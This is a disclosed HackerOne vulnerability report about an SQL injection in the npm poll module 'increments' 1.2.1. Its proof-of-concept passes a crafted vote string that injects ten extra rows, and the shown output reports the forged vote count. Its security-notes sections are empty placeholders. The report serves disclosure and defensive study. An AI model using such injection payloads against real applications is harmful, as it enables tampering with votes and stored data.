---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '508346'
original_report_id: '508346'
title: '[increments] sql injection'
weakness: SQL Injection
team_handle: nodejs-ecosystem
created_at: '2019-03-12T10:40:01.889Z'
disclosed_at: '2020-02-02T23:02:09.387Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- sql-injection
---

# [increments] sql injection

## Metadata

- HackerOne Report ID: 508346
- Weakness: SQL Injection
- Program: nodejs-ecosystem
- Disclosed At: 2020-02-02T23:02:09.387Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report `SQL Injection` in `increments`.
It allows creating fake polls.

# Module

**module name:** `increments`
**version:** `1.2.1`
**npm page:** `https://www.npmjs.com/package/increments`

## Module Description

> Increment is a **database-driven** for creating  **polls** and taking **votes** for various options, candidates, or parties. Using MongoJS collections as a storage framework, Increments offers in-depth statistical data on generated polls.

## Module Stats

[45] downloads in the last week

# Vulnerability

## Vulnerability Description

This module does not escape voting data allowing attacker to create fake votes.

## Steps To Reproduce:

- `npm install increments`
- run poc:

```javascript
const increments = require('increments');
increments.setup('mysql://root:@localhost:3306/test');
increments.poll('fruits', [{name:'Apples'},{name:'Bananas'},{name:'Oranges'},{name:'Pears'}]);
increments.vote('fruits', 'Oranges","0","0","1","0","0","0","0","","0")'+',(123,"Oranges","0","0","1","0","0","0","0","","0")'.repeat(10)+'#');
increments.statistics('fruits', function(e, f) {
	console.log( f.projectedWinner );
	process.exit(0);
});
```

Output:
```
{ name: 'Oranges',
  id: 'oranges',
  color: undefined,
  count: 11,
  percentage: 100 }
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- MacOS
- 8.12.0
- 6.4.1

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

SQL Injection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
